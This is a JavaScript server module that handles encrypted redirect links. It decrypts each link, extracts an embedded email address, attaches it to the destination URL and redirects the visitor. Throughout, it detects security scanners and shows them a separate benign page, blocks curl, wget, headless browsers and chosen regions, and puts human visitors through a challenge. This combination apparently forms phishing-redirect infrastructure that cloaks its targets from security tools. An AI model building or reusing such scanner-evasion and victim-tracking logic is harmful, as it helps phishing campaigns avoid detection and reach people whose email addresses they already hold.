module.exports = function createRedirectCoreModule(deps) {
  const {
    getClientIp,
    getDenyCacheIp,
    hasInterstitialBypass,
    getDenyCache,
    aggregatePerIpEvent,
    addLog,
    safeLogValue,
    addSpacer,
    recordOffenderSignals,
    REQUIRE_CF_HEADERS,
    hasCloudflareHeaders,
    isBanned,
    detectScannerEnhancedWithBehavior,
    recordScannerIp,
    pickScannerProfile,
    isKnownScannerIp,
    shouldImpersonateForRequest,
    addDenyCache,
    headlessSuspicion,
    addStrike,
    HEADLESS_STRIKE_WEIGHT,
    HEADLESS_SOFT_STRIKE,
    HEADLESS_BLOCK,
    getCountry,
    getASN,
    countryBlocked,
    asnBlocked,
    hashFirstSeg,
    verifyTurnstileToken,
    MAX_TOKEN_AGE_SEC,
    UA_TRUNCATE_LENGTH,
    recordChallengeBypassAttempt,
    createChallengeRedirect,
    isRateLimited,
    sanitizeChallengeReason,
    hashUaForToken,
    safeLogJson,
    LOG_ENTRY_MAX_LENGTH,
    splitCipherAndEmail,
    decodeB64urlLoose,
    isLikelyEmail,
    tryDecryptAny,
    bruteSplitDecryptFull,
    explainDecryptFailure,
    EMAIL_DISPLAY_MAX_LENGTH,
    verifyLinkHmac,
    safeDecode,
    maskEmail,
    normHost,
    isHostAllowlisted,
    URL_DISPLAY_MAX_LENGTH,
    PATH_TRUNCATE_LENGTH,
    logScannerHit,
    renderScannerSafePage,
  } = deps;

function checkSecurityPolicies(req) {
  const ip = getClientIp(req);
  const denyCacheIp = getDenyCacheIp(req);
  const ua = req.get("user-agent") || "";
  const bypassInterstitial = hasInterstitialBypass(req);

  const denyHit = getDenyCache(denyCacheIp);
  if (denyHit) {
    const shouldLog = aggregatePerIpEvent("DENY_CACHE", { ip, reason: denyHit.reason });
    if (shouldLog) {
      addLog(`[DENY-CACHE] blocked ip=${safeLogValue(ip)} keyIp=${safeLogValue(denyCacheIp)} reason=${safeLogValue(denyHit.reason, 32)}`);
      addSpacer();
    }
    recordOffenderSignals(req);
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  if (REQUIRE_CF_HEADERS && !hasCloudflareHeaders(req)) {
    addLog(
      `[CF] missing headers ip=${safeLogValue(ip)} ua="${safeLogValue(
        ua.slice(0, UA_TRUNCATE_LENGTH)
      )}"`
    );
    addSpacer();
    recordOffenderSignals(req);
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  if (bypassInterstitial) {
    addLog(
      `[BYPASS] interstitial bypass active ip=${safeLogValue(ip)} ua="${safeLogValue(
        ua.slice(0, UA_TRUNCATE_LENGTH)
      )}"`
    );
    addSpacer();
  }

  // IP bans still apply even with bypass
  if (isBanned(ip)) {
    addLog(`[BAN] blocked ip=${ip}`);
    addSpacer();
    recordOffenderSignals(req);
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  // Scanner detection → interstitial (unless bypass)
  const scannerResult = detectScannerEnhancedWithBehavior(req);
  const scannerDetections = scannerResult.detections;
  if (!bypassInterstitial && scannerResult.isScanner) {
    const topDetection = scannerDetections[0] || { name: "scanner", confidence: 0.5 };
    recordScannerIp(ip, topDetection.name);
    const scannerProfile = pickScannerProfile(topDetection, req);
    const knownScanner = isKnownScannerIp(ip);
    const shouldImpersonate = shouldImpersonateForRequest(req, scannerResult, knownScanner);

    addLog(
      `[SCANNER] interstitial ip=${safeLogValue(ip)} scanner="${safeLogValue(
        topDetection.name
      )}" confidence=${safeLogValue(String(topDetection.confidence ?? ""))} known=${knownScanner ? "1" : "0"} impersonate=${shouldImpersonate ? "1" : "0"} profile=${safeLogValue(
        scannerProfile.name
      )} ua="${safeLogValue(
        ua.slice(0, UA_TRUNCATE_LENGTH)
      )}"`
    );
    recordOffenderSignals(req);

    const reason = shouldImpersonate ? "Known scanner fingerprint" : topDetection.name;
    return {
      blocked: true,
      interstitial: true,
      scanner: topDetection.name,
      scannerProfile: shouldImpersonate ? scannerProfile : null,
      scannerReason: reason
    };
  }

  // Hard bad UAs → 403 (unless bypass)
  const BAD_UA = /(okhttp|python-requests|curl|wget|phantomjs)/i;
  if (!bypassInterstitial && BAD_UA.test(ua)) {
    addLog(`[UA-BLOCK] ip=${ip} ua="${ua.slice(0, UA_TRUNCATE_LENGTH)}"`);
    addSpacer();
    addDenyCache(denyCacheIp, "ua_block");
    recordOffenderSignals(req);
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  // Headless suspicion (strikes + optional block) (unless bypass)
  const hs = headlessSuspicion(req);
  if (!bypassInterstitial && hs.suspicious) {
    const softOnlyOne = hs.hardCount === 0 && hs.softCount === 1;
    const label =
      hs.hardCount >= 1
        ? "HEADLESS"
        : (hs.isSafariUA || hs.isFirefoxUA) && softOnlyOne
        ? "INFO"
        : hs.softCount >= 2
        ? "SUSPECT"
        : "INFO";

    addLog(`[${label}] ip=${safeLogValue(ip)} reasons=${safeLogValue(hs.reasons.join(","))}`);

    if (hs.hardCount > 0) {
      addStrike(ip, HEADLESS_STRIKE_WEIGHT);
    } else if (HEADLESS_SOFT_STRIKE && hs.softCount >= 2) {
      addStrike(ip, 1);
    }

    if (HEADLESS_BLOCK && hs.hardCount > 0) {
      addSpacer();
      addDenyCache(denyCacheIp, "headless_hard");
      recordOffenderSignals(req);
      return { blocked: true, status: 403, message: "Forbidden" };
    }
  }

  // Geo / ASN blocking (still enforced even with bypass)
  const ctry = getCountry(req);
  const asn = getASN(req);
  if (countryBlocked(ctry)) {
    const shouldLog = aggregatePerIpEvent("GEO", { ip, country: ctry, reason: "country_block" });
    if (shouldLog) {
      addLog(`[GEO] blocked country=${safeLogValue(ctry)} ip=${safeLogValue(ip)}`);
      addSpacer();
    }
    addDenyCache(denyCacheIp, "geo_block");
    recordOffenderSignals(req, { country: ctry, asn });
    return { blocked: true, status: 403, message: "Forbidden" };
  }
  if (asnBlocked(asn)) {
    const shouldLog = aggregatePerIpEvent("ASN", { ip, reason: "asn_block" });
    if (shouldLog) {
      addLog(`[ASN] blocked asn=${safeLogValue(asn)} ip=${safeLogValue(ip)}`);
      addSpacer();
    }
    addDenyCache(denyCacheIp, "asn_block");
    recordOffenderSignals(req, { country: ctry, asn });
    return { blocked: true, status: 403, message: "Forbidden" };
  }

  return { blocked: false };
}

async function verifyTurnstileAndRateLimit(req, baseString) {
  const ip = getClientIp(req);
  const ua = req.get("user-agent") || "";
  
  const token = req.query.cft || req.get("cf-turnstile-response") || "";
  const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);

  const v = await verifyTurnstileToken(token, ip, { action:"link_redirect", linkHash, maxAgeSec:MAX_TOKEN_AGE_SEC });
  if (!v.ok) {
    addLog(`[AUTH] token invalid (${v.reason}) ip=${safeLogValue(ip)} ua="${safeLogValue(ua.slice(0, UA_TRUNCATE_LENGTH))}" -> /challenge`);
    // Missing token is normal for first-time human visits; reserve bypass alerts
    // for malformed/invalid supplied tokens and tamper-like states.
    if (token || (v.reason && v.reason !== "missing")) {
      recordChallengeBypassAttempt(req, `auth_${v.reason || 'invalid'}`);
    }
    return {
      redirect: createChallengeRedirect(baseString, req, "auth_invalid", {
        host: (v.reason === "bad_hostname" && v.data && v.data.hostname) ? v.data.hostname : ""
      })
    };
  }

  const { limited, retryAfterMs } = await isRateLimited(ip);
  if (limited) {
    if (retryAfterMs && Number.isFinite(retryAfterMs)) {
      return { blocked: true, status: 429, retryAfter: Math.ceil(retryAfterMs/1000), message: "Too many requests" };
    }
    addLog(`[RL] 429 ip=${ip}`);
    addSpacer();
    return { blocked: true, status: 429, message: "Too many requests" };
  }

  if (token) {
    const challengeReason = sanitizeChallengeReason(req.query.cr || "");
    const logCtx = {
      ip: safeLogValue(ip),
      uaHash: hashUaForToken(ua),
      linkHash: safeLogValue(linkHash, 64),
      reason: safeLogValue(challengeReason || "-", 48)
    };
    addLog(`[CHALLENGE-OK] ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
  }

  return { success: true };
}

function decryptAndParseUrl(req, baseString) {
  const ip = getClientIp(req);
  const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
  
  const { mainPart, emailPart: emailPart0, delimUsed } =
    splitCipherAndEmail(baseString, decodeB64urlLoose, isLikelyEmail);

  if (delimUsed) {
    addLog(`[PARSE] delimiter used "${delimUsed}" mainLen=${mainPart.length} emailRawLen=${(emailPart0 || '').length}`);
  }

  let result = null;
  try {
    result = tryDecryptAny(mainPart);
  } catch (e) {
    addLog(`[DECRYPT] exception ip=${safeLogValue(ip)} seg="${safeLogValue(String(mainPart), EMAIL_DISPLAY_MAX_LENGTH)}" err=${safeLogValue(e.message)}`);
    addSpacer();
    return { error: "Failed to load" };
  }
  
  let decryptedPayload = result && result.url;
  let emailPart = emailPart0 || null;

  if (!decryptedPayload) {
    const bf = bruteSplitDecryptFull(baseString);
    if (bf && bf.url) {
      decryptedPayload = bf.url;
      if (!emailPart) emailPart = bf.emailRaw || null;
      addLog(`[DECRYPT] fallback split used k=${bf.kTried} emailRawLen=${(bf.emailRaw || '').length}`);
    }
  }

  if (!decryptedPayload) {
    const why = explainDecryptFailure({
      tried: result?.tried || [],
      lastErr: result?.lastErr || null,
      segLen: mainPart.length
    });
    addLog(`[DECRYPT] failed variants ip=${safeLogValue(ip)} seg="${safeLogValue(String(mainPart), EMAIL_DISPLAY_MAX_LENGTH)}" mainLen=${mainPart.length} why=${safeLogValue(why)}`);
    addSpacer();
    return { error: "Failed to load" };
  }

  let parsedUrl = decryptedPayload;
  let pinnedHost = null;
  let hmacChecked = false;
  let hmacValid = false;

  try {
    const parsed = JSON.parse(decryptedPayload);
    if (parsed && typeof parsed === "object") {
      if (typeof parsed.url === "string") parsedUrl = parsed.url;
      if (typeof parsed.dest_host === "string") pinnedHost = parsed.dest_host;
      if (parsed && typeof parsed.hmac === "string" && pinnedHost && parsedUrl) {
        const res = verifyLinkHmac(parsedUrl, pinnedHost, parsed.hmac);
        hmacChecked = true;
        hmacValid = !!res.ok;
      }
    }
  } catch {}

  if (hmacChecked && !hmacValid) {
    const ua = req.get("user-agent") || "";
    const logCtx = {
      ip: safeLogValue(ip),
      uaHash: hashUaForToken(ua),
      linkHash: safeLogValue(linkHash, 64),
      destHost: safeLogValue(pinnedHost || "-", 120)
    };
    addLog(`[DECRYPT] hmac mismatch ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
    addSpacer();
    return { error: "Failed to load" };
  }

  return { finalUrl: parsedUrl, emailPart, pinnedHost, linkHash };
}

function processEmailAndFinalizeUrl(finalUrl, emailPart) {
  if (emailPart) {
    const emailRaw = String(emailPart).replace(/[\/~]+$/,'');
    const emailDecoded = (decodeB64urlLoose(emailRaw) || safeDecode(emailRaw)).trim();

    if (emailDecoded && isLikelyEmail(emailDecoded)) {
      finalUrl += '#' + emailDecoded;
      addLog(`[EMAIL] captured ${safeLogValue(maskEmail(emailDecoded), EMAIL_DISPLAY_MAX_LENGTH)}`);
    } else if (emailDecoded) {
      addLog(`[EMAIL] ignored (not a valid email): "${safeLogValue(emailDecoded, EMAIL_DISPLAY_MAX_LENGTH)}" (raw="${safeLogValue(emailPart.slice(0,40))}…")`);
    } else {
      addLog(`[EMAIL] ignored (decode empty) raw="${safeLogValue(emailPart.slice(0,40))}…"`);
    }
  }

  return finalUrl;
}

function renderInvalidLinkPage(res) {
  const html = `<!doctype html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Link unavailable</title>
<style>
  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font:16px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial,sans-serif;background:#0c1116;color:#e8eef6;padding:24px;}
  .card{max-width:520px;width:100%;background:#0f172a;border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:24px;box-shadow:0 24px 60px rgba(0,0,0,0.45);} 
  h1{margin:0 0 8px;font-size:24px;}
  p{margin:0 0 8px;color:#cbd5e1;}
</style>
</head>
<body>
  <div class="card">
    <h1>Link invalid or expired</h1>
    <p>The link you followed is no longer valid. Please contact the sender for a fresh link.</p>
    <p>If you believe this is an error, try opening the link from the original message again.</p>
  </div>
</body>
</html>`;
  res.setHeader("Cache-Control", "no-store");
  return res.status(400).type("html").send(html);
}

function logHostPinFailure({ ip, ua, linkHash, pinnedHost, actualHost }) {
  const logCtx = {
    ip: safeLogValue(ip),
    uaHash: hashUaForToken(ua || ""),
    linkHash: safeLogValue(linkHash || "-", 64),
    pinnedHost: safeLogValue(pinnedHost || "-", 160),
    actualHost: safeLogValue(actualHost || "-", 160)
  };
  addLog(`[PIN] host mismatch ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
  addSpacer();
}

function validateAndRedirect(finalUrl, req, res, options = {}) {
  const ip = getClientIp(req);
  const ua = req.get("user-agent") || "";
  const pinnedHost = options.pinnedHost || null;
  const linkHash = options.linkHash || null;
  
  try {
    const parsedUrl = new URL(finalUrl);
    const hostname = normHost(parsedUrl.hostname);
    const protocol = parsedUrl.protocol;
    const normalizedPinnedHost = options.pinnedHost ? normHost(options.pinnedHost) : null;

    if (!["http:", "https:"].includes(protocol)) {
      addLog(`[ALLOWLIST] blocked protocol=${safeLogValue(protocol)} host=${safeLogValue(hostname)} ip=${safeLogValue(ip)}`);
      addSpacer();
      return res.status(403).send("Unauthorized URL");
    }

    if (normalizedPinnedHost && normalizedPinnedHost !== hostname) {
      logHostPinFailure({ ip, ua, linkHash, pinnedHost: normalizedPinnedHost, actualHost: hostname });
      return renderInvalidLinkPage(res);
    }

    const okHost = isHostAllowlisted(hostname);

    if (!okHost) {
      addLog(`[ALLOWLIST] blocked host=${hostname} ip=${ip}`);
      addSpacer();
      return res.status(403).send("Unauthorized URL");
    }

    addLog(`[REDIRECT] ip=${safeLogValue(ip)} -> ${safeLogValue(finalUrl, URL_DISPLAY_MAX_LENGTH)}`);
    addSpacer();
    return res.redirect(302, finalUrl);
  } catch (e) {
    addLog(`[URL] invalid ip=${safeLogValue(ip)} value="${safeLogValue((finalUrl || ""), URL_DISPLAY_MAX_LENGTH)}" err="${safeLogValue(e.message)}"`);
    addSpacer();
    return res.status(400).send("Invalid URL");
  }
}

async function handleRedirectCore(req, res, baseString){
  try {
    const clientIp = getClientIp(req);
    const ua = req.get("user-agent") || "";
    const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
    const hasSecUA = !!req.get("sec-ch-ua");
    const hasFetchSite = !!req.get("sec-fetch-site");
    const missingSecHeaders = !hasSecUA || !hasFetchSite;
    const knownBots = ["Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebot","facebookexternalhit","ia_archiver","MJ12bot","AhrefsBot","SemrushBot","DotBot","PetalBot","GPTBot","python-requests","crawler","scrapy","curl","wget","phantomjs","HeadlessChrome"];
    const isBotUA = knownBots.some(b => ua.toLowerCase().includes(b.toLowerCase()));
    const hasTurnstileToken = !!req.query.cft;

    const securityCheck = checkSecurityPolicies(req);
    if (securityCheck.blocked) {
      if (securityCheck.interstitial) {
        const nextEnc = encodeURIComponent(baseString);
        const scannerReason = securityCheck.scannerReason || "Known scanner UA";
        logScannerHit(req, scannerReason, nextEnc);
        return renderScannerSafePage(req, res, nextEnc, scannerReason, {
          scannerProfile: securityCheck.scannerProfile
        });
      }
      return res.status(securityCheck.status).send(securityCheck.message);
    }

    const authCheck = await verifyTurnstileAndRateLimit(req, baseString);
    if (authCheck.redirect) {
      return res.redirect(302, authCheck.redirect);
    }
    if (authCheck.blocked) {
      if (authCheck.retryAfter) {
        res.setHeader("Retry-After", authCheck.retryAfter);
      }
      return res.status(authCheck.status).send(authCheck.message);
    }

    if (isBotUA || missingSecHeaders) {
      const reason = isBotUA ? "bot_heuristic" : "missing_sec_headers";
      const logCtx = {
        ip: safeLogValue(clientIp),
        uaHash: hashUaForToken(ua),
        linkHash: safeLogValue(linkHash, 64),
        isBotUA,
        missingSecHeaders,
        hasSecUA: !!hasSecUA,
        hasFetchSite: !!hasFetchSite
      };
      addLog(`[CHALLENGE-TRIGGER] ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
      addSpacer();

      if (!hasTurnstileToken) {
        const reasonParam = sanitizeChallengeReason(reason);
        return res.redirect(302, createChallengeRedirect(baseString, req, reasonParam));
      }
    }

    const decryptResult = decryptAndParseUrl(req, baseString);
    if (decryptResult.error) {
      return res.status(400).send(decryptResult.error);
    }

    const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
    return validateAndRedirect(finalUrl, req, res, { pinnedHost: decryptResult.pinnedHost, linkHash: decryptResult.linkHash });
  } catch (e) {
    addLog(`[REDIRECT-ERROR] ip=${safeLogValue(getClientIp(req))} path=${safeLogValue(req.originalUrl || '', PATH_TRUNCATE_LENGTH)} err=${safeLogValue(e?.message || 'unknown')}`);
    addSpacer();
    return res.status(500).send("Temporary error");
  }
}

  return {
    handleRedirectCore,
  };
};
